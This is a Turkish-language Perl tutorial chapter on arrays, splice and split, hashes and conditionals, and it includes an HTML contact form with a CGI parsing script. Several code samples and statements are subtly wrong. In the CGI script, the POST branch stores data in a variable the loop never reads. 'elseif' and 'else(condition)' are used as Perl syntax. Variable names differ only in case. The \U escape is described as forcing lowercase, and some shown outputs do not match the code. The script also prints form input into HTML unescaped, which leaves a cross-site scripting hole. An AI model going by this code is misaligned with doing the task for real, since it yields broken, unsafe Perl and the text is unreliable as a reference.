Perl açısından @arkadas dizisinin 1 numaralı üyesi Vildan mıdır, Mustafa mıdır? Perl’ün C’den türetildiğini ve C’nin gereğinden uzun zaman aynı odada ve bilgisayarya başbaşa kalmış kişiler tarafından üretildiğini söylemiş miydik? Evet, başkaca bir açıklama tarzı olmayan şekilde, Perl için 1 numaralı üye, Vildan değil, Mustafa’dır. Çünkü Perl de C gibi, saymaya 0’dan başlar. Yani 0 numaralı “arkadas” dizisi üyesi Vildan’dır. Mesela Perl’e şu komutu versek:

@arkadas = (‘Vildan’, ‘Mustafa’, ‘Kudret’);

print $arkadas\[0\];

Nasıl bir sonuç alırız? Şöyle:

Vildan

Parantezin köşeli parantez olduğuna dikkat edin. Peki “print $arkadas\[2\];” nasıl bir sonuç verir:

Kudret

Burada bir gariplik dikkatinizi çekmiyor mu? Array (Dizi) değişkenin adının önüne @ işareti koyduğumuz halde, üyelerinin adlarını tek tek yazdırırken, neden tek başına duran değişkenler için kullandığımız $ işaretini kullanıyoruz! Tabiî, sorumuzun cevabı sorunun içinde var. Dizinin içindeki her bir üye, tek başına ele alındığı zaman tekil değişken demektir, yani Scalar değişken. Tekil (Scalar) değişkenlerin işareti ne? Dolar işareti.

Bir dizinin bir üyesinin değerini başkanı bir değişkene almaya, Perl argosunda “Sclalar dilim çıkartmak” denir! Sclalar dilimler, Scalar işaretiyle belirtilir. Sclalar dilimin değeri, Dizi’den bağımsız Scalar bir değişkene verilebilir mi? Evet. Meselâ:

$dost = $arkadas\[1\]

Hatta kelime haznesine kıran girdiği gibi bir durumla karşı karşıya iseniz, şu bile olabilir:

$arkadas = $arkadas\[1\]

Perl, Sclalar “arkadas” ile bir Dizi’nin dilimi olan arkadas\[1\]’i ayırt edebilir. Ama bu elinizle hatayı davet etmek olur. (Tekrar: parantezin köşeli olduğuna dikkat.)

Dizinin üyesini de değiştirmek mümkündür. Osman, arkadas dizisinin birinci üyesinin Vildan teyzesi değil de başka bir kişi olmasını isterse, şu komutu verebilir:

$arkadas\[0\] = ‘Tülay’

Bu durumda arkadas dizisinin üyeleri şöyle sıralanır: Tülay, Mustafa, Kudret. Peki, “Tülay” listenin başına eklemek istiyoruz; fakat “Vildan” da listede kalsın! Bunu Perl’ün unshift() fonksiyonu ile yapabiliriz:

unshift (@arkadas, “Tülay”);

Bu durumda arkadas dizisi “Tülay Vildan Mustafa Kudret” şeklini alır. “Tülay” değerini dizinin başına değil de sonuna eklemek isterseniz, bunu “push”() fonksiyonu ile yapabilirsiniz:

push (@arkadas, “Tulay”);

Şimdi diziniz “Vildan Mustafa Kudret Tulay” şeklini aldı.

/////////////////////////////////KUTU/////////////////////

**Dizileri saydırmak**

Perl isterseniz size bir dizide kaç üye bulunduğunu söyleyebilir; ya da Perl size sonuncu üyenin numarasını söyler; siz ona 1 ekleyerek toplam üye sayısını çıkartırsınız: $#arkadas değişkeni, bu dizideki son üyesinin sıra numarasını verir. Örneğin:

print $#arkadas;

komutu, 2 sayısını görüntüler. Buna 1 eklediğinizde dizinin eleman sayısını bulmuş olursunuz. CGI programlarımızda bunu kullanacağımız yerler olacak.

//////////////////////KUTU BİTTİ//////////////////////

Bir dizinin bütün üyelerini görüntüleyebiliriz:

print @arkadaş;

komutu ekrana “Tülay, Mustafa, Kudret” yazdırır.

Diziden üye çıkartmanız da mümkündür. Bunun için “shift” ve “pop”() fonksiyonlarını kullanabiliriz. “shift” birinci, “pop” sonuncu elemanı çıkartır. Bu iki fonksiyondan yararlanarak, dizi elemanı değeri tekil (Scalar) değişkene atayabiliriz. Şu koda bakın.

@sanatci = (‘Arif Sağ’, ‘Güler Duman’, ‘Sabahat Akkiraz’, ‘Davud Sulari’);

$solist = shift(@sanatcı);

print $solist;

Bu kod ekrana hangi ismi getirecektir? Tabiî, “Arif Sağ”. Peki, shift() yerine pop() fonksiyonunu kullanırsak? Davud Sulari. “shift()” birinci elemanı, “pop()” ise sonuncu elemanı diziden çıkardır.

/////////////////////////KUTU/////////////////////

Özel Değişken: $\_

Perl’ün özel bir değişkeni vardır: varsayılan değişken (defalut variable) adı verilen bu değişken, sizin kontrolünüzde olmadan, sizin adınıza değer tutar. diyelim ki Perl’e bir dosyadan metin okutuyorsunuz; okunan her satır bu değişkene yazılır. İlerde bu değişkenin kendiliğinden tuttuğu diğer işlem sonuçlarını da göreceğiz. Perl bu değişkeni o kadar benimsemiştir ki, bir çok fonksiyona bir argüman vermezseniz, Perl fonksiyonu $\_ ile icra eder. Örnek:

$\_ = “Dostu bulması zor, kaybetmesi kolaydır!”;

print();

Bu program ekrana “Dostu bulması zor, kaybetmesi kolaydır!” yazdırır.

////////////////////////KUTU BİTTİ//////////////////////

**Splice ve Split**

Fakat istiyoruz ki, listenin sadece başına veya sonuna ek yapmayalım; arzu ettiğimiz bir sıraya eleman ekleyelim ve çıkartalım. Perl bunu yapabilir mi? Evet, Perl, aylarca yerinden kalkmadan bilgisayar programlayanların hayatını kolaylaştırmak üzere geliştirilmiş bir dil olduğu için bu amaca yarayan “splice()” fonksiyona sahiptir. Kelime anlamı “yapıştırmak, eklemek” olan “splice()” fonksiyonunun dört argümanı vardır:

1. Değiştirilecek dizinin adı

2. Pozisyon: değişikliğe başlanacak eleman sıra numarası

3. Çıkartılacak eleman sayısı

4. Eklenen elemanların değerleri

Bunun örneklerini rakamlı bir dizide görürsek, kavraması kolay olur.

@sayilar = (0, 1, 2, 3, 4, 5, 6, 7, 8, 9);

splice (@sayilar, 5, 1, (‘Ev’));

print @sayilar;

Ekrana şu liste gelir:

0, 1, 2, 3, 4, Ev, 6, 7, 8, 9

Listeden bir şey atmadan da listeye ek yapabiliriz:

@sayilar = (0, 1, 2, 3, 4, 5, 6, 7, 8, 9);

splice (@sayilar, 5, 0, (‘Ev’));

print @sayilar;

Ekrana şu liste gelir:

0, 1, 2, 3, 4, Ev, 5, 6, 7, 8, 9

Burada, 5’nci elemandan itibaren 0 eleman atıp (yani kimseyi atmayıp) bir değer ekliyoruz. İstersek, “splice()” fonksiyonu ile hiç ek yapmadan istediğimiz pozisyondan istediğimiz kadar eleman çıkartabiliriz:

@sayilar = (0, 1, 2, 3, 4, 5, 6, 7, 8, 9);

splice (@sayilar, 5, 3, ());

print @sayilar;

Ekrana şu liste gelir:

0, 1, 2, 3, 4, 8, 9

Burada 5’nci elemandan itibaren 3 eleman attığımıza ve yerine boş bir liste koyduğumuza (yani hiç bir şey koymadığımıza) dikkat edin. Bu fonksiyonu boş liste vermeden de (“splice (@sayilar, 5, 3);”) yazabiliriz.

“splice” ile listeden çıkarttığınız bir elemanı, isterseniz bir başka tekil (Scalar) değişkene, birden fazla elemanı bir başka bir dizi (Array) değişkene yazabilirsiniz:

@sayilar = (0, 1, 2, 3, 4, 5, 6, 7, 8, 9);

$cikan\_sayi = splice (@sayilar, 5, 1);

print $cikan\_sayi;

Ekrana “5” sayısı gelir. Birden fazla elemanı çıkartıyorsak, bunları dizi değişkende tutmamız gerekir:

@sayilar = (0, 1, 2, 3, 4, 5, 6, 7, 8, 9);

@cikan\_sayi = splice (@sayilar, 5, 3);

print @cikan\_sayi;

Ekrana “5, 6, 7” dizisi gelir.

//////////////////kutu////////////////////

**Kolay liste!**

Perl, belki de rapor yazma dili olduğu için, liste oluşturmada özel fonksiyonlara ve kolaylıklara sahiptir. Örneğin çarpma işlemi (x), bir liste üzerinde bir argümanla uygulandığında, listenin üye sayısını argüman sayısınca çoğaltır. Örneğin:

@liste = (1, 5) x 5;

deyimi, şu sonucu verir:

(1, 5, 1, 5, 1, 5, 1, 5, 1, 5,)

Perl, vereceğiniz iki tam sayının arasını da artan diziyle doldurabilir. Bunun için yanyana iki nokta (..) kullanırız:

@dizi = (1..5)

Bu durumda dizi adlı dizinin değeri şöyle olur: 1, 2, 3, 4, 5. Bu kolaylık sadece artan bir dizi için mümkündür; aerası doldurulacak rakamlardanküçüğü önce, büyüğü sonra yazılmalıdır.

Perl aynı kolaylığı karakterler için de sağlar:

@dizi = (‘a’ .. ‘h’)

Listemiz şu elemanlara sahip olur: a b, c, d, e, f, g, h

///////////////////////KUTU BİTTİ/////////////////

“split()” fonksiyonu, Perl’ün gerçekten bir bilgi çekme ve rapor yazdırma dili olduğunu kanıtlayan fonksiyondur. Kelime anlamı “bölmek, ayırmak” olan “split()” fonksiyonu aynen bu işi yapar: Scalar biçimindeki String’leri arzu ettiğiniz yerden ayrı ettiğiniz parçalara böler. CGI ile Web sitesindeni Form’dan birbirine eklenerek gelen veri yumağını hatırlıyor musunuz: “isim=Mustafa+Durcan&yas=23”. “split()” fonksiyonu olmasa idi, bu String’i anahtar/değer çiftlerine bölmek gerçekten zor olabilirdi. Şimdi ise tek satırlık bir deyimle bunu yapabiliriz. “split” sadece böyle bir String’i bölmeye yaramakla kalmaz, fakat sabit diskteki bir düzyazı dosyasını okuyabilir; onun cümlelerini bölebilir. Düzyazı dosyası sekme veya virgülle ayırt edilmiş değerler içeren bir veritabanı dosyası olabilir; “split” ile böyle bir veritabanını okutabilir; içindeki değerleri Perl programımızda ve onun yardımıyla Web sayfamızda kullanabiliriz. Size boşuna baştan beri Perl iyi dildir, demiyorum!

“split” iki ya da üç argüman ile kullanılır:

1. Bölme noktası (delimiter=sınırlayıcı) olan karakter: bölmenin başlayacağı ve biteceği nokta.

2. Bölünecek String’i tutan değişkenin adı

3. Bölünerek elde edilecek listede bulunacak eleman sayısı.

Bölme noktasını iki bölü işareti arasına yazarız. Şimdi bu argümanların nasıl kullanıldığını örneklerle görelim:

$arkadas = “Mustafa Osman Vildan Kudret”;

@arkadaslar = split(/ /, $arkadas);

Bu deyimleri irdeleyelim: Tekil-Scalar arkadas değişkeninin değeri “Mustafa Osman Vildan Kudret” şeklinde. Bu değerin içindeki kelimeler aralık karakteri ile (boşlukla) ayrılmış. “split()” fonksiyonu ile bu dört kelimeyi bağımsız değerler haline getirmek ve dört elemanlı arkadaslar dizi değişkenine (array) atamak mümkündür. “split()” fonksiyonundan dönecek değerleri “@arkadaslar” değişkenine eşitlemekle bunu yapabiliriz. “split()” fonksiyonunu yazarken bölme noktası olarak boşlukları seçmesini iki bölü işaretinin arasına boşluk bırakarak belirtiyoruz; iki argüman virgülle ayrılıyor ve bu işlemin yapılacağı değişkenin adını yazıyoruz.

Bunu anlayıp anlamadığınızı sınamak için size bir soru:

print $arkadaslar\[1\];

fonksiyonu ekrana hangi değeri yazdırır? İpucu: Saymaya, 1’den değil 0’dan başlayın!

Diyelim ki Perl’e dosya okutmayı öğrendik ve içindeki değerler sekme (Tab karakteri) ile ayrılmış dört değer bulunan bir satırı seçerek “$kayit” değişkeninin içine yazdırdık. (Merak etmeyin birazdan öğreneceğiz Perl’e dosya okutmayı ve okuduğu satırlardan uygun olanını seçmeyi!) Şimdi istiyoruz ki, birbirinden sekme ile ayrılmış bu dört değer, $soyadi, $adi, $no ve $not değişkenlerine atansın. Bunu “split” ile şöyle yapabiliriz:

($soyadi, $adi, $no, $not) = split (/\\t/, $kayit);

Bu dieyimi de irdeleyelim: birden fazla tekil-Scalar değişkene ayanı anda değer atayabilmek için “split()” fonksiyonunun ortaya dört değer çıkartacağını bilmek zorundayız. $kayit değişkeninin içeriğini biliyoruz; sekme ile ayrılmış dört bölümden oluşan bir String-dize içeriyor. “split()” fonksiyonuna bölme noktası olarak bu kes sekme işaretini kullanmasını bildiriyoruz. Sekme veya Tab karakteri, Perl ve diğer programlama dilleri açısından özel bir durum sayılır; bu karakteri elde eetmek için klavyede Tab tuşuna basamazsınız; bu tuş ekrana Tab karakteri çıkartmaz, imlecinizi ilerletmeye karar. Aynı şekilde Return veya Enter tuşuna basarak ekrana yeni satır+satırbaşı (LF+CR) karakteri yazdıramazsınız; imlaç alttaki satırın başına gider. Bu tür özel karakterleri “Escape Durumu” denen şekilde göstermeniz gerekir. Perl’de özel karakterlerin gösterilmesi için önüne ters bölü işareti koyarak, simgesi olan harfi yazarız. Sekme işaretinin simgesi “t” harfidir; dolayısıyla bölme noktasını belirteceğimiz iki bölü işaretinin arasına ters-bölü işareti ile “t” harfini yazıyoruz. Sonra içeriğine bölme işleminin uygulanacağı değişkenin adını veriyoruz.

//////////////////////KUTU////////////////////////

**Özel Karakterlerin ‘Escape’ Durumu**

\\a Zil veya bip sesi

\\b Backspace (Geri)

\\e Escape

\\f Form Feed (Yeni sayfa)

\\l İzleyen karakteri küçük harfe zorlar

\\L İzleyen bütün karakterleri küçük harfe zorlar

\\n New Line (Yeni satır)

\\r Carrie Return (Satır başı)

\\t Tab (Sekme)

\\u İzleyen karakteri büyük harfe zorlar

\\U İzleyen bütün karakterleri küçük harfe zorlar

\\v Vertical Tab (Dikey sekme)

/////////////////////////////KUTU BİTTİ//////////////////////

Bu iki örnekte, “split()” fonksiyonunun üçüncü argümanını kullanmadık. Şimdi bir örnekle onu görelim. Diyelim ki yukarıdaki örnekte oluşturduğumuzu varsaydığımız $kayit değişkenindeki dört değerden ilk ikisini $soyadi ve $adi değişkenlerine alalım; fakat öğrencinin numarası ile notunu bir arada üçüncü bir değişkene yazdıralım. Yani “splik” işlevinin sekmelere bakarak dörde böleceği String’den dört değil üç bağımsız String çıkartalım. Bunu şu deyimle sağlayabiliriz:

($soyadi, $adi, $no\_not) = split (/\\t/, $kayit, 3);

Burada, üç değişken adı verdiğimize dikkat ediyorsunuz. “split()” fonksiyonunu da yapacağı bölme işleminin sonunda dört değil, üç bölüm çıkartmaya zorluyoruz. Bunu, bölenecek değişkenin adından sonra koyduğumuz 3 rakamı sağlıyor.

”split()” fonksiyonunu, “URL şifrelenmiş” (URL Encoded) Form verilerinin değişken ve değer olarak bölünmesi başta olmak üzere bir çok amaçla sık sık kullanacağız.

**Hash! veya İlişkili Diziler**

Tekil-Scalar değişkeni gözünüzde nasıl canlandırırsınız? Bir kutu, içinde bir değer olarak olarak değil mi? Kutunun üzerindeki etikette, bu değerin adı yazılı olabilir. Dizi ise yanyana bir çok kutu olarak canlandırılabilir. Kutuların en başında bu dizinin adı, her bir kutunun üzerinde ise kutunun sıra numarası bulunur. (0’dan başlayarak!)

Şmdi şu tabloya bakın:

**Parça No Parçanın Adı**

1234 32 MB RAM Çip

2345 Soğutma vantilatörü

3456 Pentium II – 400 MHz

4567 Pentium III – 750 MHz

6789 Matrox Millenium AGP Ekran Kartı

Bu bilgileri Perl’de nasıl değişkenlere yazabilirsiniz? İsterseniz 10 ayrı tekil-Scalar değişken oluşturur herbirinin içine bu on aynı veriyi girebilirsiniz:

$ParcaNo01 = 1234

$ParcaAdi01 = ‘32 MB RAM Çip’

$ParcaNo02 = 2345

$ParcaAdi01 = ‘Soğutma Vantilatörü’

$ParcaNo03 = 3456

$ParcaAdi01 = ‘Pentium II – 400 MHz’

......

Ya da bir dizi-array değişken yapıp, bütün verileri içine koyabiliriz:

@Parcalar = (1234, ‘32 MB RAM Çip’, 2345, ‘Soğutma Vantilatörü’, 3456, ‘Pentium II – 400 MHz’....);

Fakat her durumda, örneğin 1234 ile “32 MB RAM Çip” değerlerinin ilişkisi kaybolur. Yani ihtiyaç halinde “1234 numaralı parçanın adı neydi acaba?” derseniz, bu iki değişken tüürü de size hazır, kolay bir cevap veremez. Birinci türde, yani on ayrı tekil değişken oluşturduğunuzda, hiç bir değişkenin diğeriyle ilişkisi olamaz. İkinci türde, değişkenlerin sıra numaralarından yararlanarak bir ilişkilendirme mümkündür. Örneğin $Parcalar\[0\] ile $Parcalar\[1\] , 2 ile 3, 4 ile 5... ilişkilendirilebilir: bunun için birinciler ikincilerin endeksi sayılabilir. Fakat bu kolay bir iş değil. Fakat dedik ki, Perl hiç bir şey değilse, tam teşekküllü bir liste programıdır diye! İşte bunun bir sonucu olarak Perl’de İlişkilli Dizi (Associative Array) veya değer yazmak ve çağırmakta kullanılan Unix komutunun adıyla Hash Listesi diye bir özel değişken türü vardır. Bu değişken türü, adının önüne yüzde (%) işareti konarak belirtilir.

İlişkili Dizi’lerde iki unsur bulunur: anahtar ve değer (key ve value). Her değerin bir anahtarı; her anahtarın bir değeri vardır. Anahtar/değer çiftine Kayıt denir. İlişkili Dizi, kayıtlardan oluşur. Bir ilişkili Dizi’de aynı adda iki anahtar olamaz; fakat farklı anahtarlar aynı değere sahip olabilir.

“Her anahtarın bir değeri; her değerin bir anahtarı vardır!” dedik. Bu yüzden örneğin telefon defterinizi İlişkili Dizi olarak yazamazsınız; çünkü bir kişinin birden fazla telefonu olabilir. Bunun gibi kısıtlamalar yüzünden İlişkili Dizi’lerin sınırlı kullanım alanı vardır. Fakat Perl, göreceğimiz gibi bazı fonksiyonların sonucu olarak karşımıza İlişkili Dizi değişken çıkartabilir; ayrıca bu tür değişken için kullanılmaya hazır bir çok fonksiyon vardır; dolayısıyla biz uzun-uzun kendi fonksiyonlarımızı yazmak zorunda kalmayız.

Şimdi parça listemizi İlişkili Dizi olarak yazalım:

%Parcalar = (1234, ‘32 MB RAM Çip’, 2345. ‘Soğutma Vantilatörü’, 3456, ‘Pentium II – 400 MHz’....);

Yukarıdaki kod gerçi amacımıza ulaşmamızı sağlar; ama okuması, yazması kolay bir biçimde değil. Perl 5 ile birlikte virgül (,) yerine, “=>” operatörünü kullanabilirsiniz. Örneğin, aynı değişken şu deyimle de oluşturtulabilir:

%Parcalar = (1234 => ‘32 MB RAM Çip’

2345 => ‘Soğutma Vantilatörü’

3456 => ‘Pentium II – 400 MHz’

....

6789 => ‘Matrox Millenium AGP Ekran Kartı’

);

Peki, anahtar buradaki gibi tek kelime, hatta sayı değil de birden fazla kelime içerek bir String ise ne yapabiliriz? Anahtarı tırmak içine alırız. İşte farklı bir parça listesi İlişkili Dizi biçiminde:

%Parcalar = (“RAM Çipleri” => ‘32 MB’

“Soğutma vantilatörleri” => ‘Bronica’

“CPU Çipi” => ‘Pentium II – 400 MHz’

....

“AGP Ekran Kartı” => ‘Matrox Millenium’

);

İçi boş, yani üyeleri (anahtarları ve anahtarların değerleri) atanmamış İlişkili Dizi oluşturulabilir:

%YeniParcalar = ();

Perl, daha sonra içini dolduracağınız bir dizi hazırlar ve bekler.

Şimdi bir İlişkili Dizi değişkeninin anahtarını kullanarak, değerini bulalım ve bunu tekil/scalar değişkene atayalım:

$alınacak\_parca = $Parçalar{“6789”};

veya

$alınacak\_parca = $Parçalar{“AGP ekran Kartı”};

Burada birinci kodda $alinacak\_parca değişkeninin içeriği “Matarox Millenium AGP Ekran Kartı” olurken, ikinci kodda “Matrox Millenium” olur.

Şimdi de İlişkili Dizi’mizin bir anahtarının değerini değiştirelim. Bunun için bir anahtara değer vermemiz gerekir:

$Parcalar{“RAM Çipleri”} = “64 MB”;

(burada kullandığımız parantezin süslü parantez olduğuna dikkat edin!) Yukarıda içine “32 MB” yazdığımız “RAM Çipleri” anahtarının değerini “64 MB” olarak değiştirmiş olduk. Böyle bir deyimle karşılan Perl, önce “Parcalar” adlı İlişkizi Dizi içinde “RAM Çipleri” anahtarı bulunup bulunmadığına bakar; varsa değerini yeni verdiğimiz String ile değiştirir. ilişkili Dizi’de verdiğimiz adda bir anahtar yoksa, bu anahtar oluşturulur ve değer olarak verdiğimiz String atanır. Bu yöntemle içi boş İlişkili Dizi’de anahtar oluşturabiliriz. Yukarıda oluşturduğumuz içi boş “YeniParcalar” İlişkili Dizi’sine yer anahtar açalım ve içine bir değer yazalım:

$YeniParcalar{“RAM Çipleri”} = “128 MB”;

Mevcut bir İlişkili Dizi’nin anahtar/değer çiftini (yani kaydını) tümüyle silebiliriz; bunun için delete fonksiyonunu kullanırız. delete fonksiyonuna argüman olarak silinecek kaydın sadece anahtarını verirsiniz. Şöyle:

delete($Parcalar{“RAM Çipleri”});

delete bir fonksiyondur; dolayısıyla bir “return” değeri vardır; Perl’e bir değer verir. Bu değer, sildiğiniz anahtarın değeridir. İsterseniz, bu değeri bir tekil/Scalar değişkene atayabilirsiniz. (Nasıl?)

İlişkili Dizi’lerin kendi kolaylıkları vardır, demiştik. delete bunlardan biridir; diğeri ise keys fonksiyonudur. keys fonksiyonu bir ilişkili Dizi’nin bütün anahtarlarının listesini verir. Örneğin:

@Parcalar\_anahtarlar = keys(%Parcalar);

deyimi ile “Parcalar\_anahtarlar” adlı bir dizi değişken (array) oluşturuyoruz ve “Parcalar” adlı İlişkili Dizi’nin bütün anahtarlarını değer olarak atıyoruz. Dikkat edin! Anahtarların adlarını değer olarak atılyoruz; anahtarların değerlerini değil. Peki bu ne işe yarar? Bir örnek şu olabilir: Web sitemizdeki Form’dan gelen bilgileri tutan İlişkili Dizi’de yer alan anahtarları ve onların değerlerini kullanılır hale getirmek isteyebiliriz. Bunun örneğini ilerde göreceğiz. Fakat bir noktaya işaret edelim. İlişkili Dizi’nin içindeki anahtarlar alfabetik veya azalan-çoğalan bir sırada tutulmaz; tesadüfî (random) bir sıra ile tutulur. Dolayısıyla bu anahtarların adlarını yazdırdığımız yeni dizi değişkenin içeriği de sıralı olmayacaktır. Bu işlemi sort fonksiyonun geçirerek yaparsak, yeni dizi değişkenimizin içeriği sıralanmış olur:

@Parcalar\_anahtarlar = sort(keys(%Parcalar));

İlişkili Dizi’yi kullanışlı hale getiren hazır fonksiyonlardan bir diğeri ise anahtarların değerlerini edinmemizi sağlayan values fonksiyonudur. Bu fonksiyon, bir İlişkili Dizi’nin tüm değerlerini verir.

@Parcalar\_degerler = values(%Parcalar);

deyimi ile “Parcalar\_degerler” adlı bir dizi değişken (array) oluşturuyoruz ; bu kez “Parcalar” adlı İlişkili Dizi’nin bütün değerlerini değer olarak atıyoruz. Burada dikkat edilecek nokta, yeni dizi değişkenimizin bazı değerlerinin aynı olabileceğidir. İlişkili Dizi’de her anahtar özgün olmalıdır; anahtar adları aynı olamaz, fakat farklı anahtarlar aynı değere sahip olabilir, demiştik. Dolayısıyla values fonksiyonu ile oluşturduğumuz yeni dizi değişkende bazı değerler aynı olabilir.

Anahtarlar gibi, İlişkili Dizi’nin içindeki değerler de alfabetik veya azalan-çoğalan bir sırada tutuldığı tesadüfî (random) bir sıra ile tutulduğu için yeni dizi değişkenin içeriği de sıralı olmaz. Bu işlemi de sort fonksiyonundan geçirebiliriz; yeni dizi değişkenimizin içeriği sıralanmış olur:

@Parcalar\_degerler = sort(values(%Parcalar));

Buraya kadar yine bir çok şeyi bir arada öğrendik; durum biraz nefes almak ve bir örnek yapmak iyi olur. Şimdi açın Not Defterini (veya en beğendiğiniz düz yazı programını ve sizinle birlikte basit bir form oluşturalım. İçinde form olan HTML kodumuz şöyle olabilir:

**<HTML>**

**<HEAD>**

**<meta http-equiv="content-type" content="text/html; charset=ISO-8859-9">**

**<meta http-equiv="Content-Type" content="text/html; charset=windows-1254">**

**<meta http-equiv="Content-Language" content="tr">**

**<TITLE>Sizinle nasil temas kuralim</TITLE>**

**</HEAD>**

**<BODY>**

**<H1>Sizinle nasıl temas kuralım?</H1>**

**<FORM NAME="temasform" ACTION="form\_analiz.pl" METHOD="Post">**

**<P>Adınız: <INPUT TYPE="text" NAME="Adi" SIZE="37" maxlength="25"></P>**

**<P>Adresiniz: <INPUT TYPE="text" NAME="Adres" SIZE="37"></P>**

**<P>Posta Kodu: <INPUT TYPE="text" NAME="Kod" size="37" maxlength="5"></P>**

**<P>E-Posta: <INPUT TYPE="text" NAME="eposta" size="37"></P>**

**<P>Eğitim: <INPUT TYPE="checkbox" NAME="ilkokul" value="ON">Ilk**

** <INPUT TYPE="checkbox" NAME="Orta" value="ON">Orta**

** <INPUT TYPE="checkbox" NAME="yuksek" value="ON">Yüksek**

**<P>Merak Alanı: <SELECT NAME="Merak" SIZE="1">**

** <OPTION SELECTED VALUE="Bir alan seçiniz">Bir alan seçiniz</OPTION>**

** <OPTION VALUE="Polisiye">Polisiye</OPTION>**

** <OPTION VALUE="Siir">Şiir</OPTION>**

** <OPTION VALUE="Tarih">Tarih</OPTION>**

** <OPTION VALUE="Siyaset">Siyaset</OPTION></SELECT>**

**<P>Bize iletmek istediğiniz bir mesaj var mı?</P>**

**<TEXTAREA ROWS="5" NAME="mesaj" cols="33">Mesajınızı buraya yazınız: </TEXTAREA>**

**<p><INPUT TYPE="submit" VALUE="Gönder" name="Gonder"> <INPUT TYPE="reset" VALUE="Sil" name="Sil"></P>**

**</FORM>**

**</BODY>**

**</HTML>**

Bu Form’da kullandığımız etiketleri tanıyor ve bir Web tasarımcısı olarak bu tür Formları sık sık tasarlıyor olmalısınız. Bu kodu yazdıktan sonra form.htm adıyla kaydedin. Bu ilkelere dayanan bir form şöyle olabilir:

<cgi-perl011.tif>

Şimdi Form’un ACTION özelliğinde adı geçen Perl programını yazalım. Aşağıdaki kodu da Not Defteri gibi bir düz yazı programında yazarak ve ACTION’da verdiğiniz isimle kaydedin:

**#!/usr/local/bin/perl**

**#form\_analiz.pl**

**if ($ENV{'REQUEST\_METHOD'} eq 'GET') {**

** @girdiler = split(/&/, $ENV{'QUERY\_STRING'});**

**} elsif ($ENV{'REQUEST\_METHOD'} eq 'POST') {**

** read (STDIN, $depo, $ENV{'CONTENT\_LENGTH'});**

** @girdi = split(/&/, $depo);**

**} else {**

** print "Content-type: text/html\\n\\n";**

** print "<P>Formda bir hata var!";**

**}**

**foreach $girdi (@girdiler) {**

** ($anahtar, $deger) = split (/=/, $girdi);**

** $anahtar =~ tr/+/ /;**

** $deger =~ s/%(\[a-fA-F0-9\]\[a-fA-F0-9\])/pack("C", hex($1))/eg;**

** $deger =~ tr/+/ /;**

** $deger =~ s/%(\[a-fA-F0-9\]\[a-fA-F0-9\])/pack("C", hex($1))/eg;**

** $deger =~s/<!--(.|\\n)\*-->//g;**

** if ($formveri{$anahtar}) {**

** $formveri{$anahtar} .= ", $deger";**

** } else {**

** $formveri{$anahtar} = $deger;**

** }**

**}**

**print "Content-type: text/html\\n\\n";**

**print "<meta http-equiv=\\"content-type\\" content=\\"text/html; charset=ISO-8859-9\\">\\n";**

**print "<meta http-equiv=\\"Content-Type\\" content=\\"text/html; charset=windows-1254\\">\\n";**

**foreach $anahtar (sort keys(%formveri)) {**

**print "<P><B>$anahtar</B> alanına <B>$formveri{$anahtar} </B>değeri girildi.";**

**}******

Şimdi bu kodu irdeleyelim ve öğrendiklerimizi bu kodda belirleyelim, bilmediklerimizi öğrenelim.

**Mantıksal Sınama: if..Then Deyimi**

Önce formun başındaki mantıksal sınama demiyi olan If ile yazılan bölüme dikkat edin. Daha sonra döngüleri ele alacağız; ama kısaca belirtelim: burada çevre (Environment) değişkenlerimizden REQUEST\_METHOD’un içeriğine bakıyoruz ve bu GET ise çevre değişkenlerinden QUERY\_STRING’i kullanıyoruz; REQUEST\_METHOD’un içeriği POST ise bu kez standart girdiği veri kümesini (STDIN) kullanacağız. Fakat REQUEST\_METHOD’un içeriği boşsa, yani Form’da METHOD özelliği boş bırakılmışsa, hiç bir şey yapamayız! Bu durumda Internet ziyaretçimize bir hata mesajı yollayabiliriz: “Form’da hata var!”

Perl’de mantık şöyle çalışır: Eğer filanca koşul doğru ise şunu yap; değilse bunu yap! Dolayısıyla Perl açısından if sınavının bir argümanı olur: mantıksal bir değer. Söz gelimi, Sayı 1’in değeri 5 ise, Sayı 2’nin değeri 7 ise Perl’e şu mantık sınavını verirseniz:

Eğer Sayı 1, Sayı 2’den büyükse, “Sayı 1, Sayı 2’den Büyüktür!” yaz; Değilse “Sayı 2, Sayı 1’den Büyüktür!” yaz

Perl “Sayı 2, Sayı 1’den Büyüktür!” yazar. (Sayıların eşit olmasını nasıl sınayacağımıza birazdan geleceğiz.) Şimdi bunu Perl’ün anlayacağı deyim şekline çevirelim:

**$Sayi1 = 5;**

**$Sayi2 = 7;**

**if($sayi1 > $Sayi2) {**

** print “Sayı 1, Sayı 2’den büyüktür”; **

**} else {**

** print “Sayı 2, Sayı 1’den büyüktür”;**

**}**

Perl, mantıksal sınamaları, sadece sayılarla değil String’lerle de yapabilir. Fakat bu kez kullandığımız karşılaştırma işlem işaretleri farklı olur.

////////////////////////////KUTU////////////////////////

**Karşılaştırma Operatörleri**

**Karşılaştırma Matematik İşlemleri String İşlemleri**

Eşittir == eq

Eşit değildir != ne

Küçüktür < lt

Büyüktür > gt

Küçük veya eşittir <= le

Büyük veya eşittir >= ge

/////////////////////////////////////////KUTU BİTTİ//////////////////////

Bir karşılaştırmada, ileri sürdüğümüz iki koşul da doğru değilse, bir üçüncü, dördüncü.. n’nci koşulu arayabiliriz. Bunu “elseif” deyimi ile yaparız. Şu senaryoyu zihninizde canlandırın:

if(şart1) { işlem1 }

elseif(şart2) { işlem2 }

elseif(şart3) { işlem3 }

elseif(şart4) { işlem4 }

else(şart5) { işlem5 }

Bu, Perl açısından sırasıyla şu sınamaların yapılması demek:

1. Şart 1 doğru ise işlem 1’i yap; değilse bir sonraki satıra bak; ne komut görürsen onu icra et!

2. Şart 2 doğru ise işlem 2’yi yap; değilse bir sonraki satıra bak; ne komut görürsen onu icra et!

3. Şart 3 doğru ise işlem 3’i yap; değilse bir sonraki satıra bak; ne komut görürsen onu icra et!

4. Şart 4 doğru ise işlem 4’i yap; değilse bir sonraki satıra bak; ne komut görürsen onu icra et!

5. Şart 5 doğru ise işlem 5’i yap; değilse bir sonraki satıra bak; ne komut görürsen onu icra et!

elseif deyimini kullandıysak, else‘e gerek kalmaz; ama programcılık geleneğine göre, else daima kullanılır.

eğer...değilse şeklindeki mantık testlerinin bir diğer türü “değilse” sınavı olabilir. Yani “Sayı2 5’e eşit değilse şunu yap!” gibi. Bunu unless karşılaştırma deyimi ile yazarız:

unless ($ad eq ‘Mustafa7) {

print “Senin adın Mustafa değil!” }

unless deyimi yerine if deyimini not karşılaştırma operatörüyle birlikte kullanabiliriz:

if(not($ad eq ‘Mustafa’)) {

print “Senin adın Mustafa değil!” }

